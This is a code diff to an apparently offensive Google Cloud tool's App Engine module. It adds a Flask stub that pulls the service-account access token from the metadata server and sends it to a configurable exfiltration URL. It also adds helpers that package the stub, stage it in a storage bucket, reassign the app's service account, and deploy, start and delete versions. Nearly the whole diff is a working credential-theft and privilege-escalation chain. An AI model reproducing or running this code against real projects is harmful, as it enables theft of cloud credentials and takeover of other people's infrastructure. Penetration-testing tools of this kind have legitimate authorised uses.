@@ -1,5 +1,7 @@
 from __future__ import annotations
 
+import io
+import zipfile
 from typing import Any, Iterable
 
 from gcpwn.core.utils.action_recording import record_permissions
@@ -7,6 +9,100 @@ from gcpwn.core.utils.module_helpers import extract_path_segment, extract_path_t
 from gcpwn.core.utils.persistence import save_to_table
 from gcpwn.core.utils.serialization import field_from_row, resource_to_dict
 from gcpwn.core.utils.service_runtime import handle_service_error
+
+# Template for the stub GAE handler.
+# __EXFIL__ → repr(exfil_url), __TRIGGER_PATH__ → repr(trigger_path)
+_GAE_MAIN_PY = """\
+import json
+import os
+import urllib.request
+
+from flask import Flask, request, abort
+
+app = Flask(__name__)
+_EXFIL_URL = __EXFIL__
+_TRIGGER_PATH = __TRIGGER_PATH__
+_MARKER_TOKEN = "GCPWN_GAE_TOKEN="
+_MARKER_EMAIL = "GCPWN_GAE_EMAIL="
+
+
+def _meta(path):
+    req = urllib.request.Request(
+        f"http://metadata.google.internal/computeMetadata/v1/{path}",
+        headers={"Metadata-Flavor": "Google"},
+    )
+    return urllib.request.urlopen(req, timeout=5).read().decode()
+
+
+@app.route(_TRIGGER_PATH)
+@app.route("/_ah/health")
+def index():
+    if request.path == "/_ah/health":
+        return "ok", 200
+    try:
+        token = json.loads(_meta("instance/service-accounts/default/token")).get("access_token", "")
+        email = _meta("instance/service-accounts/default/email")
+        print(f"{_MARKER_EMAIL}{email}", flush=True)
+        print(f"{_MARKER_TOKEN}{token}", flush=True)
+        if _EXFIL_URL:
+            exfil_req = urllib.request.Request(
+                _EXFIL_URL, headers={"Authorization": f"Bearer {token}"}
+            )
+            urllib.request.urlopen(exfil_req, timeout=10)
+        return token, 200
+    except Exception as exc:
+        return f"err {exc}", 500
+
+
+@app.route("/", defaults={"path": ""})
+@app.route("/<path:path>")
+def catch_all(path):
+    abort(404)
+
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
+"""
+
+
+def build_gae_source_zip(exfil_url: str, trigger_path: str = "/") -> bytes:
+    """Return ZIP bytes containing a minimal GAE stub that exfils the metadata token."""
+    main_py = _GAE_MAIN_PY.replace("__EXFIL__", repr(exfil_url)).replace(
+        "__TRIGGER_PATH__", repr(trigger_path)
+    )
+    app_yaml = "runtime: python312\nentrypoint: python3 main.py\n"
+    requirements_txt = "Flask==3.1.3\n"
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+        zf.writestr("main.py", main_py)
+        zf.writestr("app.yaml", app_yaml)
+        zf.writestr("requirements.txt", requirements_txt)
+    return buf.getvalue()
+
+
+def stage_zip_to_gcs(
+    session,
+    *,
+    project_id: str,
+    bucket_id: str,
+    obj_name: str,
+    zip_bytes: bytes,
+    target_sa: str | None = None,
+) -> str:
+    """Upload zip_bytes to GCS bucket (created if missing). Returns https:// URL."""
+    from google.cloud import storage as _gcs
+    from google.api_core.exceptions import Conflict
+
+    gcs = _gcs.Client(project=project_id, credentials=session.credentials)
+    bucket = gcs.bucket(bucket_id)
+    if not bucket.exists():
+        try:
+            bucket = gcs.create_bucket(bucket_id, location="US")
+        except Conflict:
+            bucket = gcs.bucket(bucket_id)
+    blob = bucket.blob(obj_name)
+    blob.upload_from_string(zip_bytes, content_type="application/zip")
+    return f"https://storage.googleapis.com/{bucket_id}/{obj_name}"
 
 
 class _AppEngineBaseResource:
@@ -90,6 +186,19 @@ class AppEngineAppsResource(_AppEngineBaseResource):
         for row in (app if isinstance(app, list) else [app]):
             if isinstance(row, dict) and row:
                 save_to_table(self.session, self.TABLE_NAME, row, defaults={"project_id": project_id})
+
+    def update_service_account(self, *, project_id: str, service_account: str) -> dict:
+        from google.protobuf import field_mask_pb2
+        name = f"apps/{project_id}"
+        application = self._appengine_admin_v1.Application(service_account=service_account)
+        request = self._appengine_admin_v1.UpdateApplicationRequest(
+            name=name,
+            application=application,
+            update_mask=field_mask_pb2.FieldMask(paths=["service_account"]),
+        )
+        op = self.client.update_application(request=request)
+        result = op.result(timeout=120)
+        return resource_to_dict(result)
 
 
 class AppEngineServicesResource(_AppEngineBaseResource):
@@ -227,6 +336,58 @@ class AppEngineVersionsResource(_AppEngineBaseResource):
                 defaults={"project_id": project_id, "service_name": service_name},
                 extra_builder=lambda _obj, raw: {"version_id": extract_path_tail(raw.get("name", ""))},
             )
+
+    def create(
+        self,
+        *,
+        project_id: str,
+        service_id: str,
+        version_id: str,
+        service_account: str,
+        source_url: str,
+        serving_status: str = "STOPPED",
+    ) -> dict:
+        from google.cloud.appengine_admin_v1.types.version import ServingStatus
+        status_map = {"STOPPED": ServingStatus.STOPPED, "SERVING": ServingStatus.SERVING}
+        parent = f"apps/{project_id}/services/{service_id}"
+        version = self._appengine_admin_v1.Version(
+            id=version_id,
+            runtime="python312",
+            env="standard",
+            service_account=service_account,
+            serving_status=status_map.get(serving_status, ServingStatus.STOPPED),
+            # Manual scaling is required to allow serving_status to be toggled
+            # after deployment (automatic scaling versions ignore serving_status updates).
+            manual_scaling=self._appengine_admin_v1.ManualScaling(instances=1),
+            deployment=self._appengine_admin_v1.Deployment(
+                zip_=self._appengine_admin_v1.ZipInfo(source_url=source_url)
+            ),
+            entrypoint=self._appengine_admin_v1.Entrypoint(shell="gunicorn -b :$PORT main:app"),
+        )
+        request = self._appengine_admin_v1.CreateVersionRequest(parent=parent, version=version)
+        op = self.client.create_version(request=request)
+        result = op.result(timeout=360)
+        return resource_to_dict(result)
+
+    def update_serving_status(self, *, version_name: str, serving_status: str) -> dict:
+        from google.cloud.appengine_admin_v1.types.version import ServingStatus
+        from google.protobuf import field_mask_pb2
+        status_map = {"STOPPED": ServingStatus.STOPPED, "SERVING": ServingStatus.SERVING}
+        request = self._appengine_admin_v1.UpdateVersionRequest(
+            name=version_name,
+            version=self._appengine_admin_v1.Version(
+                serving_status=status_map.get(serving_status, ServingStatus.SERVING)
+            ),
+            update_mask=field_mask_pb2.FieldMask(paths=["serving_status"]),
+        )
+        op = self.client.update_version(request=request)
+        result = op.result(timeout=120)
+        return resource_to_dict(result)
+
+    def delete(self, *, name: str) -> None:
+        request = self._appengine_admin_v1.DeleteVersionRequest(name=name)
+        op = self.client.delete_version(request=request)
+        op.result(timeout=120)
 
 
 class AppEngineInstancesResource(_AppEngineBaseResource):
